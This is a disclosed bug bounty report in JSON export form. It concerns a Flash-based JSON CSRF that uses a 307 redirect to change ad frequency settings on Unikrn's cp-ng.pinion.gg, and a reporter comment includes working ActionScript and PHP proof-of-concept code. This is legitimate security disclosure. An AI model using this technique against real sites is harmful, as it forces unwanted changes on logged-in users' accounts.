{"id":251918,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTE5MTg=","url":"https://hackerone.com/reports/251918","title":"Flash CSRF: Update Ad Frequency %: [cp-ng.pinion.gg]","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-07-21T01:46:13.074Z","submitted_at":"2017-07-21T01:46:13.074Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"geekboy","url":"/geekboy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-06T06:31:38.932Z","bug_reporter_agreed_on_going_public_at":"2017-09-05T18:45:08.999Z","team_member_agreed_on_going_public_at":"2017-09-06T06:31:38.884Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\n###Description:\n-----------\nAttacker can update the user's Ad Frequency % using flash + 307 redirect trick by making post request to particular endpoint.\n\n###Step To Reproduce: \n-----------\n+ Get logged at: https://cp-ng.pinion.gg\n+ Visit: http://geekboy.ninja/poc/freq.swf\n+ Ad Frequency should be updated.\n\n*Note: for test i used my account with id `‚ñà‚ñà‚ñà‚ñà`, as update request use userid in endpoint, it can be modified as per need.* \n\n{F205068}\n\n\n\n\n\nPlease let me know if any more info needed !\n\n-------------\n\n__*- Geekboy!*__\n\n","bounty_amount":"40.0","formatted_bounty":"$40","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-05T18:45:09.057Z","allow_singular_disclosure_after":-126733538.31856246,"singular_disclosure_allowed":true,"vote_count":31,"voters":["jensec","sp1d3rs","spam404","jon_bottarini","prateek_0490","cuso4","hackkeencyber","eveeez","r3y","malcolmx","and 21 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1855516,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-07-21T03:38:22.989Z","updated_at":"2017-07-21T03:38:22.989Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1870476,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"We have problems reproducing this. Maybe it was fixed with another report about permissions - can you confirm the issue is gone?","automated_response":false,"created_at":"2017-07-27T10:41:12.439Z","updated_at":"2017-07-27T10:41:12.439Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1875720,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey its still working for me, maybe it didn't coz you tried to do with my account id `‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà` ","automated_response":false,"created_at":"2017-07-29T09:12:08.752Z","updated_at":"2017-09-06T06:33:06.861Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881920,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"We have problems reproducing - could you provide a poc video?","automated_response":false,"created_at":"2017-08-01T10:28:07.122Z","updated_at":"2017-08-01T10:28:07.122Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1883007,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Here it is!","automated_response":false,"created_at":"2017-08-01T16:56:48.034Z","updated_at":"2017-08-01T16:56:48.034Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":208974,"filename":"2017-07-21_07-12-52.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/208/974/685c0b37e214cd2ed6213aa432ab1e0a784d0868/2017-07-21_07-12-52.mp4?response-content-disposition=attachment%3B%20filename%3D%222017-07-21_07-12-52.mp4%22%3B%20filename%2A%3DUTF-8%27%272017-07-21_07-12-52.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143047Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=be6cdad8b82c7c68bdef36386103e32d55c9b65f5ad5a746ab3177b19d080d1f"}],"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1892593,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-08-04T10:07:26.019Z","updated_at":"2017-08-04T10:07:26.019Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1915161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@geekboy Thank you for your patience! \n\nWhat would be acceptable solution to this problem? Suggestion: ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà - the ones that change user data? \nThis suggestion is made under the assumption that flash attack relies on the browser to supply auth cookie. If we ignore the the cookie value and expect it to be  placed inside the body we would know it wasn't csrf attack.\n\nIs it too much to ask for the attack code from within swf file?","automated_response":false,"created_at":"2017-08-08T23:28:46.890Z","updated_at":"2017-09-06T06:32:07.005Z","actor":{"username":"rodjo2u","cleared":false,"url":"/rodjo2u","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1915185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No, here it is!\n\n````js\npackage\n{\n   import flash.display.Sprite;\n   import flash.net.URLLoader;\n   import flash.net.URLRequest;\n   import flash.net.URLRequestHeader;\n   import flash.net.URLRequestMethod;\n   \n   public class re extends Sprite\n   {\n       \n      \n      public function re()\n      {\n         var member1:Object = null;\n         var myJson:String = null;\n         Wonderfl.capture(stage);\n         super();\n         Wonderfl.capture(stage);\n         member1 = new Object();\n         member1 = {\"frequency\":60};\n         var myData:Object = member1;\n         myJson = JSON.stringify(myData);\n         myJson = JSON.stringify(myData);\n         var url:String = \"http://geekboy.ninja/poc/test30.php\";\n         var request:URLRequest = new URLRequest(url);\n         request.requestHeaders.push(new URLRequestHeader(\"Content-Type\",\"application/json\"));\n         request.data = myJson;\n         request.method = URLRequestMethod.POST;\n         var urlLoader:URLLoader = new URLLoader();\n         try\n         {\n            urlLoader.load(request);\n            return;\n         }\n         catch(e:Error)\n         {\n            trace(e);\n            return;\n         }\n      }\n   }\n}\n````\n\nwhere `test30.php`\n\n````php\n\u003c?php\n\n  // redirect automatically\n\n header(\"Location: https://cp-ng.pinion.gg/api-v2/communities/edit/‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\", true, 307);\n\n?\u003e\n````","automated_response":false,"created_at":"2017-08-08T23:38:06.884Z","updated_at":"2017-09-06T06:33:06.849Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1915187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For solution, anything unique you can include in the `body` or `header` that will be work!","automated_response":false,"created_at":"2017-08-08T23:41:05.585Z","updated_at":"2017-08-08T23:41:05.585Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1915189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"and this attack can perform on sitewide, wherever you using post method.","automated_response":false,"created_at":"2017-08-08T23:41:51.561Z","updated_at":"2017-08-08T23:41:51.561Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1926307,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2017-08-14T11:38:06.411Z","updated_at":"2017-08-14T11:38:06.411Z","additional_data":{"duplicate_report_id":258556},"actor":{"username":"saad21","cleared":false,"url":"/saad21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/105/230/a9255f19b381ef15c4e05ddfe516d067429831e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1975755,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@geekboy Can you please recheck if this is reproducible. It should be fixed now. ","automated_response":false,"created_at":"2017-09-04T22:44:13.904Z","updated_at":"2017-09-04T22:44:13.904Z","actor":{"username":"rodjo2u","cleared":false,"url":"/rodjo2u","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"geekboy","url":"/geekboy"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1976659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @rodjo2u!\n\nFixed!","automated_response":false,"created_at":"2017-09-05T12:02:22.581Z","updated_at":"2017-09-05T12:02:22.581Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1976671,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-09-05T12:07:14.893Z","updated_at":"2017-09-05T12:07:14.893Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Unikrn"}},"bounty_amount":"40.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"geekboy","url":"/geekboy"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1977755,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-05T18:45:09.030Z","updated_at":"2017-09-05T18:45:09.030Z","first_to_agree":true,"actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1979048,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Nice Blog post!","automated_response":false,"created_at":"2017-09-06T06:31:38.903Z","updated_at":"2017-09-06T06:31:38.903Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1979049,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-06T06:31:38.950Z","updated_at":"2017-09-06T06:31:38.950Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":5265,"category":"researcher","content":"####For readers: http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":3547,"username":"geekboy","name":"Geekboy!","bio":"Full time bug bounty hunter :)","cleared":true,"website":"https://www.geekboy.ninja","location":"‚ù§ From India üí™","created_at":"2014-03-11T16:43:45.018Z","url":"https://hackerone.com/geekboy","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}